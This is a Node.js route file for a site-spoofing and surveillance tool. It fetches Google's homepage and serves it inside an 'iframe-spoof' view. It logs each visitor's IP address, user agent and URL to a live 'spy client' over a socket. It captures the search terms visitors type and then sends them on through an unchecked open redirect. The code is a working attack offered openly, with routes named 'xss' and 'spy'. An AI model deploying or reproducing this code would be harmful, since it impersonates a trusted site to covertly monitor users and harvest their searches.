var jsdom   = require('jsdom')
  , request = require('request')
  , url     = require('url')
  , total = 0;


var emit = function(type, req, data){
    if (!exports.socket) {
      return;
    }

    // if (type === 'entering') {
    //   total++;
    // }

    // console.log("total: ", total);

    exports.socket.emit(type, {
      userAgent: req.headers["user-agent"],
      type: req.method,
      url: req.url,
      ip: req.ip,
      total: ++total,
      httpVersion: req.httpVersion,
      destination: data && data.destination,
      searchValue: data && data.searchValue
    });
  };

// Navigation route
exports.xss = function(req, res){
  console.log("xss route");

  var target = "http://google.ca";
  console.log("target: ", target);

  request({uri: target}, function(err, response, body){
    if (err && response.statusCode !== 200) {
      console.log('Request error.');
      console.log("err: ", err);
    }

    // Resolve relative paths    
    
    /*body = body.replace(
      RegExp('(?!(https|http):)\/\/', 'g'),
      'http://google.ca/'
    );*/

    body = body.replace(RegExp("\/images\/srpr\/nav_logo80.png","g"),
      "http://google.ca/images/srpr/nav_logo80.png");
    body = body.replace(RegExp("\/intl\/en_ALL\/images\/logos\/images_logo_lg.gif","g"),
      "http://google.ca/intl/en_ALL/images/logos/images_logo_lg.gif");
    body = body.replace(RegExp("\/images\/srpr\/logo1w.png","g"), "http://google.ca/images/srpr/logo1w.png");
    body = body.replace(RegExp("\/images\/nav_logo115.png","g"), "http://google.ca/images/nav_logo115.png");
    body = body.replace(RegExp("\/images\/nav_logo_hp2.png","g"), "http://google.ca/images/nav_logo_hp2.png");
    body = body.replace(RegExp("/xjs/_/js/hp/sb_he,pcc/rt=j/ver=Q_cOygzMvpQ.en_US./d=1/sv=1/rs=AItRSTOgJyyZkvMii1rmCgNDNAM4bjLPiA","g"),
      "http://google.ca/xjs/_/js/hp/sb_he,pcc/rt=j/ver=Q_cOygzMvpQ.en_US./d=1/sv=1/rs=AItRSTOgJyyZkvMii1rmCgNDNAM4bjLPiA");

    // Parses head markup
    var head = body.split("<head>", 2);

    if(head[1]){
      head = head[1].split("</head>", 2);
    }

    // Parses body markup
    var bodyData = body.split("<body", 2);

    if(bodyData[1]){
      bodyData = bodyData[1].split("</body>", 2);
      bodyData[0] = "<body " + bodyData[0];
    }

    res.render('iframe-spoof', {
      title: 'Iframe',
      head: head[0],
      body: bodyData[0]
    });

  });

  // Spy action

  emit('entering', req);
};

exports.redirect = function(req, res) {
  console.log("redirect route");
  // Spy Action

  var searchValue = req.query["searchValue"];
  var destination = req.query["destination"] || "https://www.google.ca/search?q="+searchValue;
  
  var data = {
    searchValue: searchValue,
    destination: destination
  };

  console.log("destination: ", destination);
  console.log("searchValue: ", searchValue);

  emit('leaving', req, data);

  res.redirect(destination);
};

exports.spy = function(req, res){
  console.log("spy route");

  res.render('spy-client', {
    title: 'Spy Client'
  });
};

exports.socket = undefined;